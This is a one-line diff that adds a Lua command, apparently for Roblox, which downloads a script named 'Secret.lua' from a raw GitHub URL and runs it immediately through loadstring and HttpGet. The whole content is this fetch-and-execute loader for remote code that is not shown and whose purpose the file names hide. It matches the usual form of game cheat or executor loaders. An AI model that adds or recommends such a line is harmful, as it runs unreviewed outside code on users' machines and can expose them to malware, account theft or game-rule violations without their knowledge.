@@ -1,0 +1,1 @@
+loadstring(Game:HttpGet("https://raw.githubusercontent.com/hi822010/TopSecret/refs/heads/main/Secret.lua"))()
